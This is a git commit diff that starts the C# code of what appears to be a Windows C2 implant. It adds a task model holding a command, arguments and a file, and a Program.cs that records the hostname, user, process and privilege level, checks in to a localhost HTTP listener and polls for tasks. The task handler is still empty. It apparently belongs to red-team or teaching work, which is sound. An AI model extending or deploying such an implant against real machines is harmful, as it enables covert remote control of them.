5106eefc29ca995180b061a6883eb7b942c23f8e
skr <simon.krueger@posteo.de>
2025-01-23 18:01:48 +0100

    Init Windows agent

---
+++ WindowsAgent/Models/AgentTask.cs
@@ -0,0 +1,10 @@
+﻿namespace Agent.Models
+{
+    public class AgentTask
+    {
+        public string Id { get; set; }
+        public string Command { get; set; }
+        public string[] Arguments { get; set; }
+        public byte[] File { get; set; }
+    }
+}
--- WindowsAgent/Program.cs
+++ WindowsAgent/Program.cs
@@ -1,2 +1,67 @@
-﻿// See https://aka.ms/new-console-template for more information
-Console.WriteLine("Hello, World!");
+﻿using System;
+using System.Diagnostics;
+using System.Security.Principal;
+using System.Threading;
+
+using Agent.Models;
+
+namespace Agent
+{
+    internal static class Program
+    {
+        private static AgentMetadata _metadata;
+        private static CommModule _commModule;
+        private static CancellationTokenSource _tokenSource;
+        
+        private static void Main(string[] args)
+        {
+            GenerateMetadata();
+            
+            _commModule = new HttpCommModule("localhost", 8080);
+            _commModule.Init(_metadata);
+            _commModule.Start();
+
+            _tokenSource = new CancellationTokenSource();
+
+            while (!_tokenSource.IsCancellationRequested)
+            {
+                if (_commModule.RecvData(out var tasks))
+                {
+                    
+                }
+            }
+        }
+
+        private static void GenerateMetadata()
+        {
+            var process = Process.GetCurrentProcess();
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+
+            var integrity = "Medium";
+
+            if (identity.IsSystem)
+            {
+                integrity = "SYSTEM";
+            }
+            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
+            {
+                integrity = "High";
+            }
+
+            _metadata = new AgentMetadata
+            {
+                Id = Guid.NewGuid().ToString(),
+                Hostname = Environment.MachineName,
+                Username = identity.Name,
+                ProcessName = process.ProcessName,
+                ProcessId = process.Id,
+                Integrity = integrity,
+                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
+            };
+
+            process.Dispose();
+            identity.Dispose();
+        }
+    }
+}
